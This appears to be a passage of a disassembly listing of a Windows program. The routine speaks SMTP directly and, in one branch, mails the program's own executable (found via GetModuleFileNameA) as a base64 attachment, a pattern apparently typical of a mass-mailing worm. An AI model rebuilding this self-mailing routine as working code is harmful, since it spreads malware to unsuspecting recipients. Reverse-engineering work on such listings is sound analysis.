.text:004020BB		       lea     eax, [ebp+buf]
.text:004020C1		       push    eax
.text:004020C2		       push    [ebp+var_4]
.text:004020C5		       call    sub_401D51
.text:004020CA		       add     esp, 14h
.text:004020CD		       test    al, al
.text:004020CF		       jz      loc_402821
.text:004020D5		       push    offset a2       ; "2"
.text:004020DA		       call    sub_40283D
.text:004020DF		       cmp     eax, 2
.text:004020E2		       pop     ecx
.text:004020E3		       jnz     loc_402821
.text:004020E9		       lea     eax, [ebp+buf]
.text:004020EF		       push    offset aMailFrom	; "MAIL	FROM: <"
.text:004020F4		       push    eax	       ; Dest
.text:004020F5		       call    _strcpy
.text:004020FA		       push    [ebp+var_14]    ; Source
.text:004020FD		       lea     eax, [ebp+buf]
.text:00402103		       push    eax	       ; Dest
.text:00402104		       call    _strcat
.text:00402109		       lea     eax, [ebp+buf]
.text:0040210F		       push    offset asc_407C84 ; ">\r\n"
.text:00402114		       push    eax	       ; Dest
.text:00402115		       call    _strcat
.text:0040211A		       add     esp, 18h
.text:0040211D		       lea     eax, [ebp+buf]
.text:00402123		       push    0	       ; flags
.text:00402125		       push    eax	       ; Str
.text:00402126		       call    _strlen
.text:0040212B		       pop     ecx
.text:0040212C		       push    eax	       ; len
.text:0040212D		       lea     eax, [ebp+buf]
.text:00402133		       push    eax	       ; buf
.text:00402134		       push    edi	       ; s
.text:00402135		       call    esi ; send
.text:00402137		       lea     ecx, [ebp+buf]
.text:0040213D		       push    ecx
.text:0040213E		       push    eax
.text:0040213F		       call    sub_401D51
.text:00402144		       pop     ecx
.text:00402145		       test    al, al
.text:00402147		       pop     ecx
.text:00402148		       jz      loc_402821
.text:0040214E		       push    0	       ; flags
.text:00402150		       lea     eax, [ebp+buf]
.text:00402156		       push    100h	       ; len
.text:0040215B		       push    eax	       ; buf
.text:0040215C		       push    edi	       ; s
.text:0040215D		       call    ds:recv
.text:00402163		       mov     [ebp+var_4], eax
.text:00402166		       lea     eax, [ebp+buf]
.text:0040216C		       push    1	       ; Count
.text:0040216E		       push    eax	       ; Source
.text:0040216F		       push    offset a2       ; "2"
.text:00402174		       call    _strncpy
.text:00402179		       lea     eax, [ebp+buf]
.text:0040217F		       push    eax
.text:00402180		       push    [ebp+var_4]
.text:00402183		       call    sub_401D51
.text:00402188		       add     esp, 14h
.text:0040218B		       test    al, al
.text:0040218D		       jz      loc_402821
.text:00402193		       push    offset a2       ; "2"
.text:00402198		       call    sub_40283D
.text:0040219D		       cmp     eax, 2
.text:004021A0		       pop     ecx
.text:004021A1		       jnz     loc_402821
.text:004021A7		       lea     eax, [ebp+buf]
.text:004021AD		       push    offset aRcptTo  ; "RCPT TO: <"
.text:004021B2		       push    eax	       ; Dest
.text:004021B3		       call    _strcpy
.text:004021B8		       push    [ebp+hFile]     ; Source
.text:004021BB		       lea     eax, [ebp+buf]
.text:004021C1		       push    eax	       ; Dest
.text:004021C2		       call    _strcat
.text:004021C7		       lea     eax, [ebp+buf]
.text:004021CD		       push    offset asc_407C84 ; ">\r\n"
.text:004021D2		       push    eax	       ; Dest
.text:004021D3		       call    _strcat
.text:004021D8		       add     esp, 18h
.text:004021DB		       lea     eax, [ebp+buf]
.text:004021E1		       push    0	       ; flags
.text:004021E3		       push    eax	       ; Str
.text:004021E4		       call    _strlen
.text:004021E9		       pop     ecx
.text:004021EA		       push    eax	       ; len
.text:004021EB		       lea     eax, [ebp+buf]
.text:004021F1		       push    eax	       ; buf
.text:004021F2		       push    edi	       ; s
.text:004021F3		       call    esi ; send
.text:004021F5		       lea     ecx, [ebp+buf]
.text:004021FB		       push    ecx
.text:004021FC		       push    eax
.text:004021FD		       call    sub_401D51
.text:00402202		       pop     ecx
.text:00402203		       test    al, al
.text:00402205		       pop     ecx
.text:00402206		       jz      loc_402821
.text:0040220C		       push    0	       ; flags
.text:0040220E		       lea     eax, [ebp+buf]
.text:00402214		       push    100h	       ; len
.text:00402219		       push    eax	       ; buf
.text:0040221A		       push    edi	       ; s
.text:0040221B		       call    ds:recv
.text:00402221		       mov     [ebp+var_4], eax
.text:00402224		       lea     eax, [ebp+buf]
.text:0040222A		       push    1	       ; Count
.text:0040222C		       push    eax	       ; Source
.text:0040222D		       push    offset a2       ; "2"
.text:00402232		       call    _strncpy
.text:00402237		       lea     eax, [ebp+buf]
.text:0040223D		       push    eax
.text:0040223E		       push    [ebp+var_4]
.text:00402241		       call    sub_401D51
.text:00402246		       add     esp, 14h
.text:00402249		       test    al, al
.text:0040224B		       jz      loc_402821
.text:00402251		       push    offset a2       ; "2"
.text:00402256		       call    sub_40283D
.text:0040225B		       cmp     eax, 2
.text:0040225E		       pop     ecx
.text:0040225F		       jnz     loc_402821
.text:00402265		       lea     eax, [ebp+buf]
.text:0040226B		       push    offset aData    ; "DATA\r\n"
.text:00402270		       push    eax	       ; Dest
.text:00402271		       call    _strcpy
.text:00402276		       pop     ecx
.text:00402277		       lea     eax, [ebp+buf]
.text:0040227D		       pop     ecx
.text:0040227E		       push    0	       ; flags
.text:00402280		       push    eax	       ; Str
.text:00402281		       call    _strlen
.text:00402286		       pop     ecx
.text:00402287		       push    eax	       ; len
.text:00402288		       lea     eax, [ebp+buf]
.text:0040228E		       push    eax	       ; buf
.text:0040228F		       push    edi	       ; s
.text:00402290		       call    esi ; send
.text:00402292		       lea     ecx, [ebp+buf]
.text:00402298		       push    ecx
.text:00402299		       push    eax
.text:0040229A		       call    sub_401D51
.text:0040229F		       pop     ecx
.text:004022A0		       test    al, al
.text:004022A2		       pop     ecx
.text:004022A3		       jz      loc_402821
.text:004022A9		       push    0	       ; flags
.text:004022AB		       lea     eax, [ebp+buf]
.text:004022B1		       push    100h	       ; len
.text:004022B6		       push    eax	       ; buf
.text:004022B7		       push    edi	       ; s
.text:004022B8		       call    ds:recv
.text:004022BE		       mov     [ebp+var_4], eax
.text:004022C1		       lea     eax, [ebp+buf]
.text:004022C7		       push    1	       ; Count
.text:004022C9		       push    eax	       ; Source
.text:004022CA		       push    offset a2       ; "2"
.text:004022CF		       call    _strncpy
.text:004022D4		       lea     eax, [ebp+buf]
.text:004022DA		       push    eax
.text:004022DB		       push    [ebp+var_4]
.text:004022DE		       call    sub_401D51
.text:004022E3		       add     esp, 14h
.text:004022E6		       test    al, al
.text:004022E8		       jz      loc_402821
.text:004022EE		       push    offset a2       ; "2"
.text:004022F3		       call    sub_40283D
.text:004022F8		       cmp     eax, 3
.text:004022FB		       pop     ecx
.text:004022FC		       jnz     loc_402821
.text:00402302		       push    offset a00000000	; "00000000"
.text:00402307		       call    sub_401D19
.text:0040230C		       lea     eax, [ebp+buf]
.text:00402312		       mov     [esp+13FCh+var_13FC], offset aFrom ; "From: "
.text:00402319		       push    eax	       ; Dest
.text:0040231A		       call    _strcpy
.text:0040231F		       push    [ebp+var_1C]    ; Source
.text:00402322		       lea     eax, [ebp+buf]
.text:00402328		       push    eax	       ; Dest
.text:00402329		       call    _strcat
.text:0040232E		       lea     eax, [ebp+buf]
.text:00402334		       push    ebx	       ; Source
.text:00402335		       push    eax	       ; Dest
.text:00402336		       call    _strcat
.text:0040233B		       add     esp, 18h
.text:0040233E		       lea     eax, [ebp+buf]
.text:00402344		       push    0	       ; flags
.text:00402346		       push    eax	       ; Str
.text:00402347		       call    _strlen
.text:0040234C		       pop     ecx
.text:0040234D		       push    eax	       ; len
.text:0040234E		       lea     eax, [ebp+buf]
.text:00402354		       push    eax	       ; buf
.text:00402355		       push    edi	       ; s
.text:00402356		       call    esi ; send
.text:00402358		       lea     eax, [ebp+buf]
.text:0040235E		       push    offset aTo      ; "To: "
.text:00402363		       push    eax	       ; Dest
.text:00402364		       call    _strcpy
.text:00402369		       push    [ebp+hFile]     ; Source
.text:0040236C		       lea     eax, [ebp+buf]
.text:00402372		       push    eax	       ; Dest
.text:00402373		       call    _strcat
.text:00402378		       lea     eax, [ebp+buf]
.text:0040237E		       push    ebx	       ; Source
.text:0040237F		       push    eax	       ; Dest
.text:00402380		       call    _strcat
.text:00402385		       add     esp, 18h
.text:00402388		       lea     eax, [ebp+buf]
.text:0040238E		       push    0	       ; flags
.text:00402390		       push    eax	       ; Str
.text:00402391		       call    _strlen
.text:00402396		       pop     ecx
.text:00402397		       push    eax	       ; len
.text:00402398		       lea     eax, [ebp+buf]
.text:0040239E		       push    eax	       ; buf
.text:0040239F		       push    edi	       ; s
.text:004023A0		       call    esi ; send
.text:004023A2		       lea     eax, [ebp+buf]
.text:004023A8		       push    offset aSubject ; "Subject: "
.text:004023AD		       push    eax	       ; Dest
.text:004023AE		       call    _strcpy
.text:004023B3		       push    [ebp+var_18]    ; Source
.text:004023B6		       lea     eax, [ebp+buf]
.text:004023BC		       push    eax	       ; Dest
.text:004023BD		       call    _strcat
.text:004023C2		       lea     eax, [ebp+buf]
.text:004023C8		       push    ebx	       ; Source
.text:004023C9		       push    eax	       ; Dest
.text:004023CA		       call    _strcat
.text:004023CF		       add     esp, 18h
.text:004023D2		       lea     eax, [ebp+buf]
.text:004023D8		       push    0	       ; flags
.text:004023DA		       push    eax	       ; Str
.text:004023DB		       call    _strlen
.text:004023E0		       pop     ecx
.text:004023E1		       push    eax	       ; len
.text:004023E2		       lea     eax, [ebp+buf]
.text:004023E8		       push    eax	       ; buf
.text:004023E9		       push    edi	       ; s
.text:004023EA		       call    esi ; send
.text:004023EC		       lea     eax, [ebp+buf]
.text:004023F2		       push    offset aDate    ; "Date:	"
.text:004023F7		       push    eax	       ; Dest
.text:004023F8		       call    _strcpy
.text:004023FD		       lea     eax, [ebp+var_3EC]
.text:00402403		       push    eax	       ; LPSTR
.text:00402404		       call    sub_401AC5
.text:00402409		       lea     eax, [ebp+var_3EC]
.text:0040240F		       push    eax	       ; Source
.text:00402410		       lea     eax, [ebp+buf]
.text:00402416		       push    eax	       ; Dest
.text:00402417		       call    _strcat
.text:0040241C		       lea     eax, [ebp+buf]
.text:00402422		       push    ebx	       ; Source
.text:00402423		       push    eax	       ; Dest
.text:00402424		       call    _strcat
.text:00402429		       add     esp, 1Ch
.text:0040242C		       lea     eax, [ebp+buf]
.text:00402432		       push    0	       ; flags
.text:00402434		       push    eax	       ; Str
.text:00402435		       call    _strlen
.text:0040243A		       pop     ecx
.text:0040243B		       push    eax	       ; len
.text:0040243C		       lea     eax, [ebp+buf]
.text:00402442		       push    eax	       ; buf
.text:00402443		       push    edi	       ; s
.text:00402444		       call    esi ; send
.text:00402446		       push    0	       ; flags
.text:00402448		       push    13h	       ; len
.text:0040244A		       push    offset aMimeVersion1_0 ;	"MIME-Version: 1.0\r\n"
.text:0040244F		       push    edi	       ; s
.text:00402450		       call    esi ; send
.text:00402452		       lea     eax, [ebp+buf]
.text:00402458		       push    offset aContentTypeMul ;	"Content-Type: multipart/mixed;	boundary"...
.text:0040245D		       push    eax	       ; Dest
.text:0040245E		       call    _strcpy
.text:00402463		       lea     eax, [ebp+buf]
.text:00402469		       push    offset a00000000	; "00000000"
.text:0040246E		       push    eax	       ; Dest
.text:0040246F		       call    _strcat
.text:00402474		       lea     eax, [ebp+buf]
.text:0040247A		       push    offset asc_407BFC ; "\"\r\n"
.text:0040247F		       push    eax	       ; Dest
.text:00402480		       call    _strcat
.text:00402485		       add     esp, 18h
.text:00402488		       lea     eax, [ebp+buf]
.text:0040248E		       push    0	       ; flags
.text:00402490		       push    eax	       ; Str
.text:00402491		       call    _strlen
.text:00402496		       pop     ecx
.text:00402497		       push    eax	       ; len
.text:00402498		       lea     eax, [ebp+buf]
.text:0040249E		       push    eax	       ; buf
.text:0040249F		       push    edi	       ; s
.text:004024A0		       call    esi ; send
.text:004024A2		       push    0	       ; flags
.text:004024A4		       push    2	       ; len
.text:004024A6		       push    ebx	       ; buf
.text:004024A7		       push    edi	       ; s
.text:004024A8		       call    esi ; send
.text:004024AA		       lea     eax, [ebp+var_26C]
.text:004024B0		       push    offset asc_407BF8 ; "--"
.text:004024B5		       push    eax	       ; Dest
.text:004024B6		       call    _strcpy
.text:004024BB		       lea     eax, [ebp+var_26C]
.text:004024C1		       push    offset a00000000	; "00000000"
.text:004024C6		       push    eax	       ; Dest
.text:004024C7		       call    _strcat
.text:004024CC		       lea     eax, [ebp+var_26C]
.text:004024D2		       push    ebx	       ; Source
.text:004024D3		       push    eax	       ; Dest
.text:004024D4		       call    _strcat
.text:004024D9		       add     esp, 18h
.text:004024DC		       lea     eax, [ebp+var_26C]
.text:004024E2		       push    0	       ; flags
.text:004024E4		       push    eax	       ; Str
.text:004024E5		       call    _strlen
.text:004024EA		       pop     ecx
.text:004024EB		       push    eax	       ; len
.text:004024EC		       lea     eax, [ebp+var_26C]
.text:004024F2		       push    eax	       ; buf
.text:004024F3		       push    edi	       ; s
.text:004024F4		       call    esi ; send
.text:004024F6		       lea     eax, [ebp+buf]
.text:004024FC		       push    offset aContentTypeTex ;	"Content-Type: text/plain; charset=us-as"...
.text:00402501		       push    eax	       ; Dest
.text:00402502		       call    _strcpy
.text:00402507		       pop     ecx
.text:00402508		       lea     eax, [ebp+buf]
.text:0040250E		       pop     ecx
.text:0040250F		       push    0	       ; flags
.text:00402511		       push    eax	       ; Str
.text:00402512		       call    _strlen
.text:00402517		       pop     ecx
.text:00402518		       push    eax	       ; len
.text:00402519		       lea     eax, [ebp+buf]
.text:0040251F		       push    eax	       ; buf
.text:00402520		       push    edi	       ; s
.text:00402521		       call    esi ; send
.text:00402523		       push    0	       ; flags
.text:00402525		       push    2	       ; len
.text:00402527		       push    ebx	       ; buf
.text:00402528		       push    edi	       ; s
.text:00402529		       call    esi ; send
.text:0040252B		       push    off_40717C      ; Source
.text:00402531		       lea     eax, [ebp+buf]
.text:00402537		       push    eax	       ; Dest
.text:00402538		       call    _strcpy
.text:0040253D		       pop     ecx
.text:0040253E		       lea     eax, [ebp+buf]
.text:00402544		       pop     ecx
.text:00402545		       push    0	       ; flags
.text:00402547		       push    eax	       ; Str
.text:00402548		       call    _strlen
.text:0040254D		       pop     ecx
.text:0040254E		       push    eax	       ; len
.text:0040254F		       lea     eax, [ebp+buf]
.text:00402555		       push    eax	       ; buf
.text:00402556		       push    edi	       ; s
.text:00402557		       call    esi ; send
.text:00402559		       push    41h
.text:0040255B		       push    offset a00000000000000 ;	"0000000000000000\n"
.text:00402560		       call    sub_401CDF
.text:00402565		       lea     eax, [ebp+buf]
.text:0040256B		       push    offset a00000000000000 ;	"0000000000000000\n"
.text:00402570		       push    eax	       ; Dest
.text:00402571		       call    _strcpy
.text:00402576		       add     esp, 10h
.text:00402579		       lea     eax, [ebp+buf]
.text:0040257F		       push    0	       ; flags
.text:00402581		       push    eax	       ; Str
.text:00402582		       call    _strlen
.text:00402587		       pop     ecx
.text:00402588		       push    eax	       ; len
.text:00402589		       lea     eax, [ebp+buf]
.text:0040258F		       push    eax	       ; buf
.text:00402590		       push    edi	       ; s
.text:00402591		       call    esi ; send
.text:00402593		       push    off_407180      ; Source
.text:00402599		       lea     eax, [ebp+buf]
.text:0040259F		       push    eax	       ; Dest
.text:004025A0		       call    _strcpy
.text:004025A5		       pop     ecx
.text:004025A6		       lea     eax, [ebp+buf]
.text:004025AC		       pop     ecx
.text:004025AD		       push    0	       ; flags
.text:004025AF		       push    eax	       ; Str
.text:004025B0		       call    _strlen
.text:004025B5		       pop     ecx
.text:004025B6		       push    eax	       ; len
.text:004025B7		       lea     eax, [ebp+buf]
.text:004025BD		       push    eax	       ; buf
.text:004025BE		       push    edi	       ; s
.text:004025BF		       call    esi ; send
.text:004025C1		       push    50h
.text:004025C3		       push    offset a00000000000000 ;	"0000000000000000\n"
.text:004025C8		       call    sub_401CDF
.text:004025CD		       lea     eax, [ebp+buf]
.text:004025D3		       push    offset a00000000000000 ;	"0000000000000000\n"
.text:004025D8		       push    eax	       ; Dest
.text:004025D9		       call    _strcpy
.text:004025DE		       add     esp, 10h
.text:004025E1		       lea     eax, [ebp+buf]
.text:004025E7		       push    0	       ; flags
.text:004025E9		       push    eax	       ; Str
.text:004025EA		       call    _strlen
.text:004025EF		       pop     ecx
.text:004025F0		       push    eax	       ; len
.text:004025F1		       lea     eax, [ebp+buf]
.text:004025F7		       push    eax	       ; buf
.text:004025F8		       push    edi	       ; s
.text:004025F9		       call    esi ; send
.text:004025FB		       push    off_407184      ; Source
.text:00402601		       lea     eax, [ebp+buf]
.text:00402607		       push    eax	       ; Dest
.text:00402608		       call    _strcpy
.text:0040260D		       pop     ecx
.text:0040260E		       lea     eax, [ebp+buf]
.text:00402614		       pop     ecx
.text:00402615		       push    0	       ; flags
.text:00402617		       push    eax	       ; Str
.text:00402618		       call    _strlen
.text:0040261D		       pop     ecx
.text:0040261E		       push    eax	       ; len
.text:0040261F		       lea     eax, [ebp+buf]
.text:00402625		       push    eax	       ; buf
.text:00402626		       push    edi	       ; s
.text:00402627		       call    esi ; send
.text:00402629		       push    0	       ; flags
.text:0040262B		       push    4	       ; len
.text:0040262D		       push    offset asc_407B8C ; "\r\n\r\n"
.text:00402632		       push    edi	       ; s
.text:00402633		       call    esi ; send
.text:00402635		       lea     eax, [ebp+var_26C]
.text:0040263B		       push    0	       ; flags
.text:0040263D		       push    eax	       ; Str
.text:0040263E		       call    _strlen
.text:00402643		       pop     ecx
.text:00402644		       push    eax	       ; len
.text:00402645		       lea     eax, [ebp+var_26C]
.text:0040264B		       push    eax	       ; buf
.text:0040264C		       push    edi	       ; s
.text:0040264D		       call    esi ; send
.text:0040264F		       cmp     [ebp+var_C], 0
.text:00402653		       jnz     short loc_40265C
.text:00402655		       push    offset aContentTypeApp ;	"Content-Type: application/octet-stream;"...
.text:0040265A		       jmp     short loc_402661
.text:0040265C ; ---------------------------------------------------------------------------
.text:0040265C
.text:0040265C loc_40265C:			       ; CODE XREF: sub_401D65+8EEj
.text:0040265C		       push    offset aContentTypeA_0 ;	"Content-Type: application/x-zip-compres"...
.text:00402661
.text:00402661 loc_402661:			       ; CODE XREF: sub_401D65+8F5j
.text:00402661		       lea     eax, [ebp+buf]
.text:00402667		       push    eax	       ; Dest
.text:00402668		       call    _strcpy
.text:0040266D		       pop     ecx
.text:0040266E		       lea     eax, [ebp+buf]
.text:00402674		       pop     ecx
.text:00402675		       push    [ebp+var_10]    ; Source
.text:00402678		       push    eax	       ; Dest
.text:00402679		       call    _strcat
.text:0040267E		       lea     eax, [ebp+buf]
.text:00402684		       push    offset aContentTransfe ;	"\"\r\nContent-Transfer-Encoding: base64\r\nC"...
.text:00402689		       push    eax	       ; Dest
.text:0040268A		       call    _strcat
.text:0040268F		       push    [ebp+var_10]    ; Source
.text:00402692		       lea     eax, [ebp+buf]
.text:00402698		       push    eax	       ; Dest
.text:00402699		       call    _strcat
.text:0040269E		       lea     eax, [ebp+buf]
.text:004026A4		       push    offset asc_407BFC ; "\"\r\n"
.text:004026A9		       push    eax	       ; Dest
.text:004026AA		       call    _strcat
.text:004026AF		       add     esp, 20h
.text:004026B2		       lea     eax, [ebp+buf]
.text:004026B8		       push    0	       ; flags
.text:004026BA		       push    eax	       ; Str
.text:004026BB		       call    _strlen
.text:004026C0		       pop     ecx
.text:004026C1		       push    eax	       ; len
.text:004026C2		       lea     eax, [ebp+buf]
.text:004026C8		       push    eax	       ; buf
.text:004026C9		       push    edi	       ; s
.text:004026CA		       call    esi ; send
.text:004026CC		       push    0	       ; flags
.text:004026CE		       push    2	       ; len
.text:004026D0		       push    ebx	       ; buf
.text:004026D1		       push    edi	       ; s
.text:004026D2		       call    esi ; send
.text:004026D4		       lea     ecx, [ebp+buf]
.text:004026DA		       push    ecx
.text:004026DB		       push    eax
.text:004026DC		       call    sub_401D51
.text:004026E1		       pop     ecx
.text:004026E2		       test    al, al
.text:004026E4		       pop     ecx
.text:004026E5		       jz      loc_402821
.text:004026EB		       cmp     [ebp+var_C], 0
.text:004026EF		       jnz     short loc_402707
.text:004026F1		       lea     eax, [ebp+PathName]
.text:004026F7		       push    400h	       ; nSize
.text:004026FC		       push    eax	       ; lpFilename
.text:004026FD		       push    0	       ; hModule
.text:004026FF		       call    ds:GetModuleFileNameA
.text:00402705		       jmp     short loc_40271C
.text:00402707 ; ---------------------------------------------------------------------------
.text:00402707
.text:00402707 loc_402707:			       ; CODE XREF: sub_401D65+98Aj
.text:00402707		       lea     eax, [ebp+hObject]
.text:0040270D		       push    eax	       ; Source
.text:0040270E		       lea     eax, [ebp+PathName]
.text:00402714		       push    eax	       ; Dest
.text:00402715		       call    _strcpy
.text:0040271A		       pop     ecx
.text:0040271B		       pop     ecx
.text:0040271C
.text:0040271C loc_40271C:			       ; CODE XREF: sub_401D65+9A0j
.text:0040271C		       lea     eax, [ebp+PathName]
.text:00402722		       push    0	       ; iReadWrite
.text:00402724		       push    eax	       ; lpPathName
.text:00402725		       call    ds:_lopen
.text:0040272B		       cmp     eax, 0FFFFFFFFh
.text:0040272E		       mov     [ebp+hFile], eax
.text:00402731		       jz      short loc_402748
.text:00402733		       push    48h	       ; int
.text:00402735		       push    edi	       ; s
.text:00402736		       push    eax	       ; hFile
.text:00402737		       call    sub_401C10
.text:0040273C		       add     esp, 0Ch
.text:0040273F		       push    [ebp+hFile]     ; hFile
.text:00402742		       call    ds:_lclose
.text:00402748
.text:00402748 loc_402748:			       ; CODE XREF: sub_401D65+9CCj
.text:00402748		       push    0	       ; flags
.text:0040274A		       push    2	       ; len
.text:0040274C		       push    ebx	       ; buf
.text:0040274D		       push    edi	       ; s
.text:0040274E		       call    esi ; send
.text:00402750		       lea     eax, [ebp+var_26C]
.text:00402756		       push    offset asc_407BF8 ; "--"
.text:0040275B		       push    eax	       ; Dest
.text:0040275C		       call    _strcpy
.text:00402761		       lea     eax, [ebp+var_26C]
.text:00402767		       push    offset a00000000	; "00000000"
.text:0040276C		       push    eax	       ; Dest
.text:0040276D		       call    _strcat
.text:00402772		       lea     eax, [ebp+var_26C]
.text:00402778		       push    offset asc_407ACC ; "--\r\n"
.text:0040277D		       push    eax	       ; Dest
.text:0040277E		       call    _strcat
.text:00402783		       add     esp, 18h
.text:00402786		       xor     ebx, ebx
.text:00402788		       lea     eax, [ebp+var_26C]
.text:0040278E		       push    ebx	       ; flags
.text:0040278F		       push    eax	       ; Str
.text:00402790		       call    _strlen
.text:00402795		       pop     ecx
.text:00402796		       push    eax	       ; len
.text:00402797		       lea     eax, [ebp+var_26C]
.text:0040279D		       push    eax	       ; buf
.text:0040279E		       push    edi	       ; s
.text:0040279F		       call    esi ; send
.text:004027A1		       lea     eax, [ebp+buf]
.text:004027A7		       push    offset a_       ; "\r\n.\r\n"
.text:004027AC		       push    eax	       ; Dest
.text:004027AD		       call    _strcpy
.text:004027B2		       pop     ecx
.text:004027B3		       lea     eax, [ebp+buf]
.text:004027B9		       pop     ecx
.text:004027BA		       push    ebx	       ; flags
.text:004027BB		       push    eax	       ; Str
.text:004027BC		       call    _strlen
.text:004027C1		       pop     ecx
.text:004027C2		       push    eax	       ; len
.text:004027C3		       lea     eax, [ebp+buf]
.text:004027C9		       push    eax	       ; buf
.text:004027CA		       push    edi	       ; s
.text:004027CB		       call    esi ; send
.text:004027CD		       push    ebx	       ; flags
.text:004027CE		       mov     ebx, ds:recv
.text:004027D4		       lea     eax, [ebp+buf]
.text:004027DA		       push    100h	       ; len
.text:004027DF		       push    eax	       ; buf
.text:004027E0		       push    edi	       ; s
.text:004027E1		       call    ebx ; recv
.text:004027E3		       lea     eax, [ebp+buf]
.text:004027E9		       push    offset aQuit    ; "QUIT\r\n"
.text:004027EE		       push    eax	       ; Dest
.text:004027EF		       call    _strcpy
.text:004027F4		       pop     ecx
.text:004027F5		       lea     eax, [ebp+buf]
.text:004027FB		       pop     ecx
.text:004027FC		       push    0	       ; flags
.text:004027FE		       push    eax	       ; Str
.text:004027FF		       call    _strlen
.text:00402804		       pop     ecx
.text:00402805		       push    eax	       ; len
.text:00402806		       lea     eax, [ebp+buf]
.text:0040280C		       push    eax	       ; buf
.text:0040280D		       push    edi	       ; s
.text:0040280E		       call    esi ; send
.text:00402810		       push    0	       ; flags
.text:00402812		       lea     eax, [ebp+buf]
.text:00402818		       push    100h	       ; len
.text:0040281D		       push    eax	       ; buf
.text:0040281E		       push    edi	       ; s
.text:0040281F		       call    ebx ; recv
.text:00402821
.text:00402821 loc_402821:			       ; CODE XREF: sub_401D65+325j
.text:00402821					       ; sub_401D65+36Aj ...
.text:00402821		       push    2	       ; how
.text:00402823		       push    edi	       ; s
.text:00402824		       call    ds:shutdown
.text:0040282A		       push    edi	       ; s
.text:0040282B		       call    ds:closesocket
.text:00402831		       push    1
.text:00402833		       pop     eax
.text:00402834		       jmp     short loc_402838
.text:00402836 ; ---------------------------------------------------------------------------
.text:00402836
.text:00402836 loc_402836:			       ; CODE XREF: sub_401D65+16Bj
.text:00402836					       ; sub_401D65+1E0j ...
.text:00402836		       xor     eax, eax
.text:00402838
.text:00402838 loc_402838:			       ; CODE XREF: sub_401D65+2B6j
.text:00402838					       ; sub_401D65+ACFj
.text:00402838		       pop     edi
.text:00402839		       pop     esi
.text:0040283A		       pop     ebx
.text:0040283B		       leave
.text:0040283C		       retn
.text:0040283C sub_401D65      endp
.text:0040283C
.text:0040283D
.text:0040283D ; =============== S U B R O U T I N E =======================================
.text:0040283D
.text:0040283D
.text:0040283D sub_40283D      proc near	       ; CODE XREF: sub_401D65+375p
.text:0040283D					       ; sub_401D65+433p ...
.text:0040283D
.text:0040283D arg_0	       = dword ptr  4
.text:0040283D
.text:0040283D		       push    esi
.text:0040283E		       mov     esi, [esp+4+arg_0]
.text:00402842		       push    edi
.text:00402843		       xor     edi, edi
.text:00402845
.text:00402845 loc_402845:			       ; CODE XREF: sub_40283D+13j
.text:00402845		       mov     al, [esi]
.text:00402847		       cmp     al, 20h
.text:00402849		       jz      short loc_40284F
.text:0040284B		       cmp     al, 9
.text:0040284D		       jnz     short loc_402852
.text:0040284F
.text:0040284F loc_40284F:			       ; CODE XREF: sub_40283D+Cj
.text:0040284F		       inc     esi
.text:00402850		       jmp     short loc_402845
.text:00402852 ; ---------------------------------------------------------------------------
.text:00402852
.text:00402852 loc_402852:			       ; CODE XREF: sub_40283D+10j
.text:00402852					       ; sub_40283D+2Ej
.text:00402852		       movsx   eax, byte ptr [esi]
.text:00402855		       push    eax	       ; C
.text:00402856		       call    _isalnum
.text:0040285B		       test    eax, eax
.text:0040285D		       pop     ecx
.text:0040285E		       jz      short loc_40286D
.text:00402860		       movsx   ecx, byte ptr [esi]
.text:00402863		       lea     eax, [edi+edi*4]
.text:00402866		       inc     esi
.text:00402867		       lea     edi, [ecx+eax*2-30h]
.text:0040286B		       jmp     short loc_402852
.text:0040286D ; ---------------------------------------------------------------------------
.text:0040286D
.text:0040286D loc_40286D:			       ; CODE XREF: sub_40283D+21j
.text:0040286D		       mov     eax, edi
.text:0040286F		       pop     edi
.text:00402870		       pop     esi
.text:00402871		       retn
.text:00402871 sub_40283D      endp
.text:00402871
.text:00402872
.text:00402872 ; =============== S U B R O U T I N E =======================================
.text:00402872
.text:00402872
.text:00402872 sub_402872      proc near	       ; CODE XREF: sub_402B56+175p
.text:00402872					       ; sub_402B56+190p
.text:00402872
.text:00402872 arg_0	       = dword ptr  4
.text:00402872
.text:00402872		       mov     edx, [esp+arg_0]
.text:00402876		       xor     ecx, ecx
.text:00402878
.text:00402878 loc_402878:			       ; CODE XREF: sub_402872+1Cj
.text:00402878		       mov     al, [ecx+edx]
.text:0040287B		       test    al, al
.text:0040287D		       jz      short loc_402883
.text:0040287F		       cmp     al, 0Ah
.text:00402881		       jnz     short loc_402887
.text:00402883
.text:00402883 loc_402883:			       ; CODE XREF: sub_402872+Bj
.text:00402883		       mov     byte ptr	[ecx+edx], 20h
.text:00402887
.text:00402887 loc_402887:			       ; CODE XREF: sub_402872+Fj
.text:00402887		       inc     ecx
.text:00402888		       cmp     ecx, 1000h
.text:0040288E		       jl      short loc_402878
.text:00402890		       and     byte ptr	[edx+1000h], 0
.text:00402897		       retn
.text:00402897 sub_402872      endp
.text:00402897
.text:00402898
.text:00402898 ; =============== S U B R O U T I N E =======================================
.text:00402898
.text:00402898 ; Attributes: bp-based frame
.text:00402898
.text:00402898 sub_402898      proc near	       ; CODE XREF: sub_402B56+19Cp
.text:00402898
.text:00402898 Source	       = byte ptr -1000h
.text:00402898 arg_0	       = dword ptr  8
.text:00402898
.text:00402898		       push    ebp
.text:00402899		       mov     ebp, esp
.text:0040289B		       mov     eax, 1000h
.text:004028A0		       call    __alloca_probe
.text:004028A5		       push    esi
.text:004028A6		       lea     eax, [ebp+Source]
.text:004028AC		       push    offset word_414B6C ; Source
.text:004028B1		       push    eax	       ; Dest
.text:004028B2		       call    _strcpy
.text:004028B7		       mov     esi, [ebp+arg_0]
.text:004028BA		       pop     ecx
.text:004028BB		       pop     ecx
.text:004028BC		       xor     ecx, ecx
.text:004028BE		       xor     eax, eax
.text:004028C0
.text:004028C0 loc_4028C0:			       ; CODE XREF: sub_402898+51j
.text:004028C0		       mov     dl, [eax+esi]
.text:004028C3		       test    eax, eax
.text:004028C5		       jle     short loc_4028DB
.text:004028C7		       cmp     dl, 20h
.text:004028CA		       jnz     short loc_4028DB
.text:004028CC		       cmp     [eax+esi-1], dl
.text:004028D0		       jnz     short loc_4028E3
.text:004028D2		       mov     [ebp+ecx+Source], dl
.text:004028D9		       jmp     short loc_4028E2
.text:004028DB ; ---------------------------------------------------------------------------
.text:004028DB
.text:004028DB loc_4028DB:			       ; CODE XREF: sub_402898+2Dj
.text:004028DB					       ; sub_402898+32j
.text:004028DB		       mov     [ebp+ecx+Source], dl
.text:004028E2
.text:004028E2 loc_4028E2:			       ; CODE XREF: sub_402898+41j
.text:004028E2		       inc     ecx
.text:004028E3
.text:004028E3 loc_4028E3:			       ; CODE XREF: sub_402898+38j
